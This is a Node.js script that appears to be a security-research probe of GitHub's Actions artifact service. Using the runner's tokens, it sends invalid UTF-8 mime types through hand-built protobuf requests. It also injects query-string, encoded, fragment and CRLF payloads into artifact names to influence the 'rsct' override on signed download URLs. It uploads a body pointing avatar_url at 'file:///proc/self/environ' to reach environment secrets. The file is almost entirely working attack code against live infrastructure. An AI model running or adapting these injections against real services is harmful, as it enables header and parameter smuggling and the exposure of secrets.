'use strict';

// Final bounded GitHub Actions Results probe for Repo Cassette.
// It checks two gaps left by the earlier matrix:
//   1. invalid UTF-8 in protobuf StringValue mime_type;
//   2. artifact-name influence on the signed REST download overrides.
// Signed URLs and tokens are never printed.

const crypto = require('node:crypto');
const https = require('node:https');

const SERVICE = 'github.actions.results.api.v1.ArtifactService';
const ODD = Buffer.concat([Buffer.from([0x85]), Buffer.from('application/json')]);

function request(url, {method = 'GET', headers = {}, body = null} = {}) {
  return new Promise((resolve, reject) => {
    const req = https.request(url, {method, headers}, response => {
      const chunks = [];
      response.on('data', chunk => chunks.push(Buffer.from(chunk)));
      response.on('end', () => resolve({
        status: response.statusCode || 0,
        headers: response.headers,
        body: Buffer.concat(chunks),
      }));
    });
    req.setTimeout(20000, () => req.destroy(new Error('HTTP timeout')));
    req.on('error', reject);
    req.end(body);
  });
}

function idsFromToken(token) {
  const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
  const scope = String(claims.scp || '').split(' ').find(x => x.startsWith('Actions.Results:'));
  const fields = scope?.split(':') || [];
  if (fields.length !== 3) throw new Error('Actions.Results scope unavailable');
  return {run: fields[1], job: fields[2]};
}

function varint(value) {
  let n = BigInt(value);
  const out = [];
  while (n >= 0x80n) {
    out.push(Number(n & 0x7fn) | 0x80);
    n >>= 7n;
  }
  out.push(Number(n));
  return Buffer.from(out);
}

function fieldBytes(no, data) {
  data = Buffer.from(data);
  return Buffer.concat([varint((no << 3) | 2), varint(data.length), data]);
}

function fieldString(no, value) { return fieldBytes(no, Buffer.from(value)); }
function fieldInt(no, value) { return Buffer.concat([varint(no << 3), varint(value)]); }
function fieldMimeBytes(data) { return fieldBytes(6, fieldBytes(1, data)); }

function binaryCreate(ids, name, mimeBytes) {
  return Buffer.concat([
    fieldString(1, ids.run),
    fieldString(2, ids.job),
    fieldString(3, name),
    fieldInt(5, 7),
    fieldMimeBytes(mimeBytes),
  ]);
}

async function twirpRaw(method, token, body, type) {
  const origin = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  return request(`${origin}/twirp/${SERVICE}/${method}`, {
    method: 'POST',
    headers: {
      authorization: `Bearer ${token}`,
      accept: type,
      'content-type': type,
      'content-length': String(body.length),
    },
    body,
  });
}

async function twirpJson(method, token, value) {
  const response = await twirpRaw(method, token, Buffer.from(JSON.stringify(value)), 'application/json');
  let parsed = {};
  try { parsed = JSON.parse(response.body.toString()); } catch {}
  return {response, parsed};
}

function parseBinaryCreate(response) {
  const body = response.body;
  let pos = 0;
  let ok = false;
  let url = '';
  function readVarint() {
    let value = 0n;
    let shift = 0n;
    while (pos < body.length) {
      const byte = body[pos++];
      value |= BigInt(byte & 0x7f) << shift;
      if (!(byte & 0x80)) return value;
      shift += 7n;
    }
    throw new Error('truncated protobuf');
  }
  while (pos < body.length) {
    const tag = Number(readVarint());
    const no = tag >>> 3;
    const wire = tag & 7;
    if (wire === 0) {
      const value = readVarint();
      if (no === 1) ok = value !== 0n;
    } else if (wire === 2) {
      const length = Number(readVarint());
      const data = body.subarray(pos, pos + length);
      pos += length;
      if (no === 2) url = data.toString();
    } else {
      throw new Error('unexpected protobuf response wire type');
    }
  }
  return {ok, signed_upload_url: url};
}

async function createJson(token, ids, name, version, mime) {
  return twirpJson('CreateArtifact', token, {
    workflow_run_backend_id: ids.run,
    workflow_job_run_backend_id: ids.job,
    name,
    version,
    mime_type: mime,
  });
}

async function put(url, body) {
  return request(url, {
    method: 'PUT',
    headers: {
      'content-type': 'application/octet-stream',
      'content-length': String(body.length),
      'x-ms-blob-type': 'BlockBlob',
      'x-ms-blob-content-type': ODD.toString('latin1'),
    },
    body,
  });
}

function responseError(response) {
  if (response.status < 400) return '';
  return response.body.toString('utf8').replace(/[?&]sig=[^&" ]+/gi, '?sig=REDACTED').slice(0, 280);
}

function parseLocation(location) {
  if (!location) return null;
  const url = new URL(location);
  const counts = {};
  for (const key of url.searchParams.keys()) counts[key] = (counts[key] || 0) + 1;
  const latinHex = value => Buffer.from(value || '', 'latin1').toString('hex');
  return {
    host: url.host,
    pathHash: crypto.createHash('sha256').update(url.pathname).digest('hex').slice(0, 12),
    keys: Object.keys(counts).sort(),
    keyCounts: counts,
    rscdHex: latinHex(url.searchParams.get('rscd')),
    rsctHex: latinHex(url.searchParams.get('rsct')),
  };
}

async function restDownload(repository, artifactId, expected) {
  const first = await request(`https://api.github.com/repos/${repository}/actions/artifacts/${artifactId}/zip`, {
    headers: {
      accept: 'application/vnd.github.v3+json',
      authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
      'user-agent': 'repo-cassette-last-mile',
    },
  });
  const location = first.headers.location || '';
  const final = location ? await request(location, {headers: {'user-agent': 'repo-cassette-last-mile'}}) : first;
  const type = Array.isArray(final.headers['content-type'])
    ? final.headers['content-type'][0] : final.headers['content-type'] || '';
  return {
    firstStatus: first.status,
    location: parseLocation(location),
    finalStatus: final.status,
    contentTypeHex: Buffer.from(type, 'latin1').toString('hex'),
    bodyMatch: final.body.equals(expected),
  };
}

function payload(repository, artifactId) {
  const path = `${repository}/actions/artifacts/${artifactId}/zip`;
  const document = {
    full_name: path,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'last-mile carrier',
    stargazers_count: 0,
    padding: '',
  };
  const base = Buffer.from(JSON.stringify(document));
  document.padding = 'A'.repeat(256 - base.length);
  const body = Buffer.from(JSON.stringify(document));
  if (body.length !== 256) throw new Error('payload padding failed');
  return body;
}

async function finalizeAccepted(token, ids, repository, label, name, create) {
  const uploadUrl = create.signed_upload_url || create.signedUploadUrl || '';
  if (!create.ok || !uploadUrl) return {label, accepted: false};
  const placeholder = Buffer.alloc(256, 0x20);
  const upload = await put(uploadUrl, placeholder);
  const final = await twirpJson('FinalizeArtifact', token, {
    workflow_run_backend_id: ids.run,
    workflow_job_run_backend_id: ids.job,
    name,
    size: String(placeholder.length),
  });
  const artifactId = String(final.parsed.artifact_id || final.parsed.artifactId || '');
  if (upload.status < 200 || upload.status >= 300 || !/^\d+$/.test(artifactId)) {
    return {label, accepted: true, uploadStatus: upload.status, finalizeStatus: final.response.status};
  }
  const body = payload(repository, artifactId);
  await put(uploadUrl, body);
  return {
    label,
    accepted: true,
    artifactId,
    download: await restDownload(repository, artifactId, body),
  };
}

async function invalidUtf8Cases(token, ids, repository, nonce) {
  const a = Buffer.from('application/json');
  const specs = [
    ['raw-nel-leading', Buffer.concat([Buffer.from([0x85]), a])],
    ['raw-nel-trailing', Buffer.concat([a, Buffer.from([0x85])])],
    ['overlong-nel-leading', Buffer.concat([Buffer.from([0xc1, 0x85]), a])],
    ['valid-u0085-leading', Buffer.concat([Buffer.from([0xc2, 0x85]), a])],
  ];
  for (const [index, [label, mime]] of specs.entries()) {
    const name = `last-mile-utf8-${nonce}-${index}`;
    const response = await twirpRaw(
      'CreateArtifact', token, binaryCreate(ids, name, mime), 'application/protobuf',
    );
    let create = {};
    try { create = parseBinaryCreate(response); } catch {}
    const result = {
      label,
      createStatus: response.status,
      error: responseError(response),
      ...await finalizeAccepted(token, ids, repository, label, name, create),
    };
    console.log(`LAST_MILE_UTF8 ${JSON.stringify(result)}`);
  }
}

async function nameCases(token, ids, repository, nonce) {
  const suffixes = [
    ['control', '.json'],
    ['question', '.json?rsct=%85application%2Fjson'],
    ['ampersand', '.json&rsct=%85application%2Fjson'],
    ['encoded', '.json%26rsct%3D%2585application%252Fjson'],
    ['fragment', '.json#rsct=%85application%2Fjson'],
    ['nel', `.json${String.fromCharCode(0x85)}application-json`],
    ['crlf', '.json\r\nrsct: %85application/json'],
  ];
  for (const [index, [label, suffix]] of suffixes.entries()) {
    const name = `last-mile-name-${nonce}-${index}${suffix}`;
    const created = await createJson(token, ids, name, 6, ODD.toString('latin1'));
    const result = {
      label,
      createStatus: created.response.status,
      error: responseError(created.response),
      ...await finalizeAccepted(token, ids, repository, label, name, created.parsed),
    };
    console.log(`LAST_MILE_NAME ${JSON.stringify(result)}`);
  }
}

async function main() {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const repository = process.env.GITHUB_REPOSITORY;
  if (!token || !repository || !process.env.GITHUB_TOKEN) throw new Error('Actions environment incomplete');
  const ids = idsFromToken(token);
  const nonce = `${process.env.GITHUB_RUN_ID}-${crypto.randomBytes(3).toString('hex')}`;
  await invalidUtf8Cases(token, ids, repository, nonce);
  await nameCases(token, ids, repository, nonce);
}

main().catch(error => {
  console.error(error.stack || error);
  process.exitCode = 1;
});
